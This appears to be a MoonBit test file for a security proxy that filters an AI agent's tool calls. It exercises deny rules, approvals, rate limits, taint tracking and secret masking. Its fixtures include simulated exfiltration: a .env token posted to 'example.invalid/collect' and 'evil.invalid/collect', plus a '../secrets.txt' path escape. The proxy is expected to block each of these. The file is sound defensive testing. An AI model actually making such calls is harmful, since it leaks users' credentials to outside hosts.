///|
fn engine_policy_text() -> String {
  (
    #|{"version":1,"name":"engine-test","default_decision":"deny",
    #| "rules":[
    #|  {"id":"escape","tool":"fs.*","decision":"deny","when":[{"arg":"path","prefix":[".."]}]},
    #|  {"id":"read","tool":"fs.read","decision":"allow"},
    #|  {"id":"write","tool":"fs.write","decision":"approval","approval_ttl_ms":1000},
    #|  {"id":"net","tool":"net.*","decision":"allow"}
    #| ],
    #| "egress":{"tools":["net.*"],"on_taint":"deny"},
    #| "sensitive":[{"tool":"fs.read","when":[{"arg":"path","glob":["**/*.env"]}]}],
    #| "rate":{"window_ms":60000,"max_calls":50},
    #| "min_secret_len":8,
    #| "hide_denied":true}
  )
}

///|
fn engine_session(policy_text : String) -> Session {
  let policy = parse_policy(policy_text) catch { _ => abort("bad test policy") }
  new_session("test", policy)
}

///|
fn request_line(id : Int32, verb : String, params : Json) -> String {
  json_render(
    json_obj([
      ("jsonrpc", json_str("2.0")),
      ("id", json_int(id)),
      ("method", json_str(verb)),
      ("params", params),
    ]),
  )
}

///|
fn call_params(tool : String, args : Json) -> Json {
  json_obj([("name", json_str(tool)), ("arguments", args)])
}

///|
fn lines_of(actions : Array[Json], kind : String) -> Array[String] {
  let out : Array[String] = []
  for action in actions {
    if string_field(action, "kind") == Some(kind) {
      match string_field(action, "line") {
        Some(line) => out.push(line)
        None => ()
      }
    }
  }
  out
}

///|
fn collect_ledger(actions : Array[Json], sink : Array[String]) -> Unit {
  for line in lines_of(actions, "ledger") {
    sink.push(line)
  }
}

///|
fn approvals_of(actions : Array[Json]) -> Array[String] {
  let out : Array[String] = []
  for action in actions {
    if string_field(action, "kind") == Some("approval") {
      match string_field(action, "call") {
        Some(call) => out.push(call)
        None => ()
      }
    }
  }
  out
}

///|
test "blocked calls never reach upstream and carry lineage evidence" {
  let session = engine_session(engine_policy_text())
  let ledger : Array[String] = []

  let list_actions = client_line(
    session,
    request_line(1, "tools/list", Json::null()),
    1000L,
  )
  collect_ledger(list_actions, ledger)
  inspect(lines_of(list_actions, "upstream").length(), content="1")

  let list_result = json_render(
    json_obj([
      ("jsonrpc", json_str("2.0")),
      ("id", json_int(1)),
      (
        "result",
        json_obj([
          (
            "tools",
            json_arr([
              json_obj([("name", json_str("fs.read"))]),
              json_obj([("name", json_str("fs.write"))]),
              json_obj([("name", json_str("fs.delete"))]),
              json_obj([("name", json_str("net.post"))]),
            ]),
          ),
        ]),
      ),
    ]),
  )
  let filtered = server_line(session, list_result, 1001L)
  collect_ledger(filtered, ledger)
  let to_client = lines_of(filtered, "client")
  inspect(to_client.length(), content="1")
  inspect(to_client[0].contains("fs.delete"), content="false")
  inspect(to_client[0].contains("fs.read"), content="true")

  let read = client_line(
    session,
    request_line(
      2,
      "tools/call",
      call_params("fs.read", json_obj([("path", json_str("config/.env"))])),
    ),
    1002L,
  )
  collect_ledger(read, ledger)
  inspect(lines_of(read, "upstream").length(), content="1")

  let read_result = json_render(
    json_obj([
      ("jsonrpc", json_str("2.0")),
      ("id", json_int(2)),
      (
        "result",
        json_obj([
          (
            "content",
            json_arr([
              json_obj([
                ("type", json_str("text")),
                ("text", json_str("TOKEN=abcd1234efgh\nOTHER=no")),
              ]),
            ]),
          ),
        ]),
      ),
    ]),
  )
  let tainted = server_line(session, read_result, 1003L)
  collect_ledger(tainted, ledger)
  inspect(session.taint.length(), content="1")

  let egress = client_line(
    session,
    request_line(
      3,
      "tools/call",
      call_params(
        "net.post",
        json_obj([
          ("url", json_str("https://example.invalid/collect")),
          ("body", json_str("token=abcd1234efgh")),
        ]),
      ),
    ),
    1004L,
  )
  collect_ledger(egress, ledger)
  inspect(lines_of(egress, "upstream").length(), content="0")
  let denials = lines_of(egress, "client")
  inspect(denials.length(), content="1")
  inspect(denials[0].contains("egress-taint"), content="true")
  inspect(denials[0].contains("c2"), content="true")
  inspect(denials[0].contains("abcd1234"), content="false")
}

///|
test "path escapes hit the narrow deny rule, not the default" {
  let session = engine_session(engine_policy_text())
  let ledger : Array[String] = []
  let actions = client_line(
    session,
    request_line(
      9,
      "tools/call",
      call_params("fs.read", json_obj([("path", json_str("../secrets.txt"))])),
    ),
    1000L,
  )
  collect_ledger(actions, ledger)
  inspect(lines_of(actions, "upstream").length(), content="0")
  inspect(
    lines_of(actions, "client")[0].contains("\"rule\":\"escape\""),
    content="true",
  )
}

///|
test "an approval is bound to one call and expires" {
  let session = engine_session(engine_policy_text())
  let ledger : Array[String] = []
  let first = client_line(
    session,
    request_line(
      11,
      "tools/call",
      call_params(
        "fs.write",
        json_obj([
          ("path", json_str("reports/a.md")),
          ("content", json_str("hello")),
        ]),
      ),
    ),
    1000L,
  )
  collect_ledger(first, ledger)
  inspect(lines_of(first, "upstream").length(), content="0")
  let calls = approvals_of(first)
  inspect(calls.length(), content="1")

  let granted = resolve_approval(session, calls[0], true, 1500L)
  collect_ledger(granted, ledger)
  inspect(lines_of(granted, "upstream").length(), content="1")
  inspect(
    lines_of(granted, "upstream")[0].contains("reports/a.md"),
    content="true",
  )

  // Second resolution must not forward anything: the grant is consumed.
  let replay = resolve_approval(session, calls[0], true, 1600L)
  inspect(lines_of(replay, "upstream").length(), content="0")

  // A different call needs its own approval, even moments later.
  let second = client_line(
    session,
    request_line(
      12,
      "tools/call",
      call_params(
        "fs.write",
        json_obj([
          ("path", json_str("reports/b.md")),
          ("content", json_str("hello")),
        ]),
      ),
    ),
    2000L,
  )
  collect_ledger(second, ledger)
  let second_calls = approvals_of(second)
  inspect(second_calls.length(), content="1")
  inspect(second_calls[0] == calls[0], content="false")
  // Expire it: the client gets -32002 and the upstream sees nothing.
  let expired = expire_approvals(session, 4000L)
  collect_ledger(expired, ledger)
  inspect(lines_of(expired, "client")[0].contains("-32002"), content="true")
  inspect(lines_of(expired, "upstream").length(), content="0")
}

///|
test "rate limiting counts attempts and fails closed" {
  let policy = parse_policy(
    (
      #|{"version":1,"name":"rate","default_decision":"deny",
      #| "rules":[{"id":"read","tool":"fs.read","decision":"allow"}],
      #| "rate":{"window_ms":60000,"max_calls":2}}
    ),
  ) catch {
    _ => fail("bad policy")
  }
  let session = new_session("rate", policy)
  let line = request_line(
    1,
    "tools/call",
    call_params("fs.read", json_obj([("path", json_str("a.md"))])),
  )
  let first = client_line(session, line, 1000L)
  let second = client_line(session, line, 1100L)
  let third = client_line(session, line, 1200L)
  inspect(lines_of(first, "upstream").length(), content="1")
  inspect(lines_of(second, "upstream").length(), content="1")
  inspect(lines_of(third, "upstream").length(), content="0")
  inspect(lines_of(third, "client")[0].contains("rate-limit"), content="true")
}

///|
test "server-initiated sampling is refused by default" {
  let session = engine_session(engine_policy_text())
  let sampling = json_render(
    json_obj([
      ("jsonrpc", json_str("2.0")),
      ("id", json_int(77)),
      ("method", json_str("sampling/createMessage")),
      ("params", json_obj([])),
    ]),
  )
  let actions = server_line(session, sampling, 1000L)
  inspect(lines_of(actions, "client").length(), content="0")
  let to_server = lines_of(actions, "upstream")
  inspect(to_server.length(), content="1")
  inspect(to_server[0].contains("-32001"), content="true")
}

///|
test "malformed input is answered, not forwarded" {
  let session = engine_session(engine_policy_text())
  let actions = client_line(session, "{not json", 1000L)
  inspect(lines_of(actions, "upstream").length(), content="0")
  inspect(lines_of(actions, "client")[0].contains("-32700"), content="true")
}

///|
test "ledger chain verifies and detects tampering" {
  let session = engine_session(engine_policy_text())
  let ledger : Array[String] = []
  match string_field(open_session(session, 1000L), "line") {
    Some(line) => ledger.push(line)
    None => abort("missing ledger line")
  }
  for i in 0..<5 {
    let actions = client_line(
      session,
      request_line(
        100 + i,
        "tools/call",
        call_params("fs.read", json_obj([("path", json_str("notes.md"))])),
      ),
      1100L + i.to_int64(),
    )
    collect_ledger(actions, ledger)
  }
  collect_ledger([close_session(session, 2000L)], ledger)
  let verified = verify_ledger(ledger)
  let intact = match json_get(verified, "ok") {
    Some(True) => true
    _ => false
  }
  inspect(intact, content="true")

  // Flip one character inside a decision and re-verify.
  let tampered : Array[String] = []
  for i, line in ledger {
    if i == 2 {
      tampered.push(line.replace(old="fs.read", new="fs.writ"))
    } else {
      tampered.push(line)
    }
  }
  let broken = verify_ledger(tampered)
  let broken_flag = match json_get(broken, "ok") {
    Some(False) => true
    _ => false
  }
  inspect(broken_flag, content="true")
}

///|
test "secrets are masked in results and revealed only for approved destinations" {
  let policy_text =
    #|{"version":1,"name":"secret","default_decision":"deny",
    #| "rules":[
    #|  {"id":"read","tool":"fs.read","decision":"allow"},
    #|  {"id":"post","tool":"net.post","decision":"allow"}
    #| ],
    #| "sensitive":[{"tool":"fs.read","when":[{"arg":"path","glob":["**/*.env"]}]}],
    #| "reveal":[{"id":"internal","tool":"net.post","when":[{"arg":"url","prefix":["http://internal/"]}]}],
    #| "egress":{"tools":["net.*"],"on_taint":"deny"},
    #| "min_secret_len":12}
  let policy = parse_policy(policy_text) catch { _ => abort("bad policy") }
  let session = new_session("secret", policy)
  let ledger : Array[String] = []
  let raw_secret = "sk-live-abcd1234efgh"

  let read = client_line(
    session,
    request_line(
      1,
      "tools/call",
      call_params("fs.read", json_obj([("path", json_str("config/.env"))])),
    ),
    1000L,
  )
  collect_ledger(read, ledger)
  let read_result = json_render(
    json_obj([
      ("jsonrpc", json_str("2.0")),
      ("id", json_int(1)),
      (
        "result",
        json_obj([
          (
            "content",
            json_arr([
              json_obj([
                ("type", json_str("text")),
                ("text", json_str("API_KEY=" + raw_secret)),
              ]),
            ]),
          ),
        ]),
      ),
    ]),
  )
  let masked = server_line(session, read_result, 1001L)
  collect_ledger(masked, ledger)
  let to_client = lines_of(masked, "client")[0]
  inspect(to_client.contains(raw_secret), content="false")
  inspect(to_client.contains("«mg:"), content="true")
  let start = find_substring(to_client, "«mg:")
  let placeholder = to_client[start:start + 21].to_owned()

  let external = client_line(
    session,
    request_line(
      2,
      "tools/call",
      call_params(
        "net.post",
        json_obj([
          ("url", json_str("http://evil.invalid/collect")),
          ("body", json_str(placeholder)),
        ]),
      ),
    ),
    1002L,
  )
  collect_ledger(external, ledger)
  inspect(lines_of(external, "upstream").length(), content="0")
  inspect(
    lines_of(external, "client")[0].contains("secret-reveal"),
    content="true",
  )

  let internal = client_line(
    session,
    request_line(
      3,
      "tools/call",
      call_params(
        "net.post",
        json_obj([
          ("url", json_str("http://internal/collect")),
          ("body", json_str(placeholder)),
        ]),
      ),
    ),
    1003L,
  )
  collect_ledger(internal, ledger)
  let forwarded = lines_of(internal, "upstream")
  inspect(forwarded.length(), content="1")
  inspect(forwarded[0].contains(raw_secret), content="true")
  inspect(forwarded[0].contains("«mg:"), content="false")
  for line in ledger {
    inspect(line.contains(raw_secret), content="false")
  }
  let verified = verify_ledger(ledger)
  let intact = match json_get(verified, "ok") {
    Some(True) => true
    _ => false
  }
  inspect(intact, content="true")
}

///|
fn find_substring(text : String, needle : String) -> Int32 {
  match text.find(needle) {
    Some(index) => index
    None => 0
  }
}
